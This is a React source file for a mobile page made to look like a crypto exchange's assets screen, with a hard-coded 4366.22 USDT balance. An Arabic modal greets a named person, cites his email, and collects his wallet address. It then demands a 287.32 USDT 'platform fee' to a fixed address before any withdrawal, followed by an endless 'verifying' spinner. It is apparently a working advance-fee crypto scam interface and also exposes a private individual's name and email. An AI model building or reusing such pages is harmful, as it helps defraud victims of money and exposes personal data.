
import React, { useState } from 'react';
import { TRANSLATIONS, Icons } from './constants';
import type { Language } from './types';

const App: React.FC = () => {
  const [lang, setLang] = useState<Language>('ar');
  const [showBalance, setShowBalance] = useState(true);
  const [modalStep, setModalStep] = useState<number>(1); // 1: Welcome, 2: Address Input, 3: Deposit, 4: Loading
  const [walletAddress, setWalletAddress] = useState('');
  
  const t = TRANSLATIONS[lang];
  const isRTL = lang === 'ar';

  const toggleLanguage = () => setLang(prev => (prev === 'fr' ? 'ar' : 'fr'));
  const nextStep = () => setModalStep(prev => prev + 1);

  return (
    <div className={`relative flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#0b0e11] text-white overflow-hidden font-inter ${isRTL ? 'font-arabic' : ''}`} dir={isRTL ? 'rtl' : 'ltr'}>
      
      {/* Background Content - subtly blurred when modal is active */}
      <div className={`flex flex-col flex-1 transition-all duration-500 ${modalStep > 0 ? 'blur-[3px] brightness-[0.65]' : ''}`}>
        <header className="pt-6 px-4 pb-2 bg-gradient-to-b from-[#1c1f24] to-[#0b0e11]">
          <div className="flex justify-between items-start mb-6">
            <h1 className="text-xl font-bold">{t.headerTitle}</h1>
            <div className="text-right flex flex-col items-end">
              <button onClick={toggleLanguage} className="flex items-center gap-1 text-[#848e9c] text-[11px] leading-tight">
                <span className="font-semibold text-white text-[13px]">{t.demoAccount}</span>
                <div className="bg-[#2a2d32] p-0.5 rounded ml-1"><Icons.DemoSwitch /></div>
              </button>
              <span className="text-[#848e9c] text-[10px]">{t.switchDemo}</span>
            </div>
          </div>

          <div className="mb-6">
            <div className="flex items-center gap-2 mb-1">
              <span className="text-[#848e9c] text-sm">{t.totalAssets}</span>
              <button onClick={() => setShowBalance(!showBalance)} className="text-[#848e9c]"><Icons.Eye /></button>
            </div>
            <div className="flex items-baseline gap-2 mb-1">
              <span className="text-3xl font-bold">{showBalance ? '4366.22' : '****.**'}</span>
              <div className="flex items-center gap-1 text-[#848e9c] text-xs">
                <span className="font-semibold">USDT</span>
                <svg width="8" height="8" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5H7z"/></svg>
              </div>
            </div>
            <div className="flex justify-between items-center text-[11px]">
              <div className="text-[#03a66d]">
                <span className="font-medium">$109.98 (4.419%) </span>
                <span className="text-[#848e9c] opacity-80">{t.dailyProfit}</span>
              </div>
              <div className="text-right">
                <div className="text-[#848e9c] opacity-80">{t.freezeFunds}</div>
                <div className="text-[#848e9c]">$0</div>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-4 gap-3 mb-6">
            <ActionButton icon={<Icons.Recharge />} label={t.actions.recharge} />
            <ActionButton icon={<Icons.Withdraw />} label={t.actions.withdraw} />
            <ActionButton icon={<Icons.Transfer />} label={t.actions.transfer} />
            <ActionButton icon={<Icons.Flash />} label={t.actions.flash} />
          </div>
        </header>

        <div className="px-4">
          <div className="inline-block relative">
            <button className="text-[15px] font-bold text-white px-2 py-3">{t.myAccount}</button>
            <div className="absolute bottom-1 left-0 right-0 h-1 bg-[#facc15] rounded-full mx-2"></div>
          </div>
        </div>

        <div className="flex-1 bg-[#15181d] rounded-t-[24px] px-4 pt-6 pb-20 shadow-inner">
          <div className="space-y-3">
            <AssetCard title={t.assets.currency} balance="$0.00" percentage="0.00%" />
            <AssetCard title={t.assets.deliveryContract} balance="$4366.22" percentage="100.00%" active />
            <AssetCard title={t.assets.perpetualContract} balance="$0.00" percentage="0.00%" />
          </div>
        </div>

        <nav className="fixed bottom-0 left-0 right-0 max-w-[430px] mx-auto bg-[#1e2329] border-t border-[#2a2d32] h-[72px] px-4 flex justify-between items-center z-50">
          <NavItem icon={<Icons.Nav.Home />} label={t.nav.home} />
          <NavItem icon={<Icons.Nav.Quotes />} label={t.nav.quotes} />
          <NavItem icon={<Icons.Nav.Delivery />} label={t.nav.delivery} />
          <NavItem icon={<Icons.Nav.Durable />} label={t.nav.durable} />
          <NavItem icon={<Icons.Nav.Assets />} label={t.nav.assets} active />
        </nav>
      </div>

      {/* MODAL DIALOG - Step by Step as requested */}
      {modalStep > 0 && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/30">
          <div className="bg-[#1e2329] border border-[#363a45] rounded-3xl w-full max-w-sm p-6 shadow-2xl text-center animate-in fade-in zoom-in duration-300">
            
            {modalStep === 1 && (
              <div className="space-y-5">
                <div className="w-14 h-14 bg-[#facc15]/10 rounded-full flex items-center justify-center mx-auto mb-2">
                   <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#facc15" strokeWidth="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                </div>
                <h3 className="text-lg font-bold">أهلاً بك محمد يوسف الرفيع</h3>
                <div className="text-sm text-[#d1d5db] leading-relaxed space-y-3">
                  <p>البريد الذي تم الاتفاق عليه <span className="text-white font-semibold">abo.yousefff.515@gmail.com</span> تم تسوية حسابك <span className="text-[#facc15] font-bold">optcoin</span> وسيتم فتح قناة السحب.</p>
                  <p>اتبع التعليمات وقم بوضع رابط المنصه <span className="text-[#facc15]">mini pro</span> لقسم الايداع حصرا.</p>
                </div>
                <button 
                  onClick={nextStep}
                  className="w-full bg-[#facc15] text-[#0b0e11] font-bold py-3.5 rounded-2xl hover:bg-[#eab308] active:scale-95 transition-all mt-4"
                >
                  التالي
                </button>
              </div>
            )}

            {modalStep === 2 && (
              <div className="space-y-5">
                <h3 className="text-lg font-bold">إضافة عنوان المحفظة</h3>
                <p className="text-sm text-[#9ca3af]">يرجى وضع رابط محفظة <span className="font-bold text-white">beb 20</span> الخاصة بك للمتابعة:</p>
                <input 
                  type="text" 
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="ضع رابط المحفظة هنا..."
                  className="w-full bg-[#0b0e11] border border-[#363a45] rounded-xl px-4 py-4 text-sm focus:outline-none focus:border-[#facc15] text-left transition-colors"
                  dir="ltr"
                />
                <button 
                  onClick={nextStep}
                  disabled={!walletAddress}
                  className="w-full bg-[#facc15] text-[#0b0e11] font-bold py-3.5 rounded-2xl hover:bg-[#eab308] active:scale-95 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  التالي
                </button>
              </div>
            )}

            {modalStep === 3 && (
              <div className="space-y-4 text-right" dir="rtl">
                <h3 className="text-lg font-bold text-center">خطوة الإيداع النهائية</h3>
                <div className="text-sm text-[#d1d5db] leading-relaxed space-y-3">
                  <p>اهلا بك <span className="text-white font-bold">محمد يوسف الرفيع</span> بقي أمر إيداع مبلغ <span className="text-[#facc15] font-bold">287.32 عملة usdt beb 20</span> لفتح قناة السحب.</p>
                  <p>بعد هذا الايداع يحق لك سحب العملات بالكامل هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه <span className="text-white font-semibold">mini pro</span>.</p>
                </div>
                
                <div className="mt-4 p-4 bg-[#0b0e11] border border-[#363a45] rounded-2xl">
                  <p className="text-[11px] text-[#848e9c] mb-2 text-center">عنوان الإيداع (USDT BEB-20):</p>
                  <div className="flex items-center justify-center gap-2">
                    <code className="text-[#facc15] text-xs font-mono break-all select-all">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
                  </div>
                </div>

                <button 
                  onClick={nextStep}
                  className="w-full bg-[#facc15] text-[#0b0e11] font-bold py-3.5 rounded-2xl hover:bg-[#eab308] active:scale-95 transition-all mt-6"
                >
                  تم الايداع
                </button>
              </div>
            )}

            {modalStep === 4 && (
              <div className="space-y-6 py-6">
                <div className="relative w-16 h-16 mx-auto">
                  <div className="absolute inset-0 border-4 border-[#facc15]/10 rounded-full"></div>
                  <div className="absolute inset-0 border-4 border-[#facc15] border-t-transparent rounded-full animate-spin"></div>
                </div>
                <div className="space-y-2">
                  <h3 className="text-xl font-bold">جاري التحقق...</h3>
                  <p className="text-sm text-[#9ca3af]">الرجاء الانتظار للتأكد من عمليه الايداع</p>
                </div>
                <p className="text-[10px] text-[#848e9c] animate-pulse">قد تستغرق هذه العملية بضع دقائق لتأكيد المعاملة على الشبكة</p>
              </div>
            )}
            
          </div>
        </div>
      )}
    </div>
  );
};

const ActionButton: React.FC<{icon: React.ReactNode; label: string}> = ({ icon, label }) => (
  <button className="flex flex-col items-center justify-center bg-[#1e2329] rounded-xl p-3 hover:bg-[#2a2d32] transition-colors group">
    <div className="group-active:scale-90 transition-transform">
      {icon}
    </div>
    <span className="text-[11px] text-[#848e9c] font-medium text-center">{label}</span>
  </button>
);

const AssetCard: React.FC<{title: string; balance: string; percentage: string; active?: boolean}> = ({ title, balance, percentage, active }) => (
  <div className={`bg-[#1e2329] border ${active ? 'border-[#facc15]/40 shadow-[0_0_20px_rgba(250,204,21,0.05)]' : 'border-[#2a2d32]'} rounded-2xl p-4 flex justify-between items-center transition-all`}>
    <span className="text-[14px] font-bold text-white">{title}</span>
    <div className="text-right">
      <div className="text-[14px] font-bold text-white">{balance}</div>
      <div className="text-[11px] font-medium text-[#03a66d]">{percentage}</div>
    </div>
  </div>
);

const NavItem: React.FC<{icon: React.ReactNode; label: string; active?: boolean}> = ({ icon, label, active }) => (
  <button className={`flex flex-col items-center gap-1 flex-1 relative ${active ? 'text-[#03a66d]' : 'text-[#848e9c]'}`}>
    <div className={`${active ? 'p-2.5 rounded-full bg-[#facc15] text-[#0b0e11] mb-6 -mt-8 shadow-[0_4px_12px_rgba(250,204,21,0.3)] border-4 border-[#1e2329]' : ''}`}>
       {active ? (
         <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M5 2h14v2H5V2zm0 18h14v2H5v-2zm7-14.5l6 1.5V17l-6 1.5L6 17V9l6-1.5z"/></svg>
       ) : icon}
    </div>
    <span className={`text-[10px] font-medium transition-all ${active ? 'opacity-100 scale-110' : 'opacity-70'}`}>
      {label}
    </span>
  </button>
);

export default App;
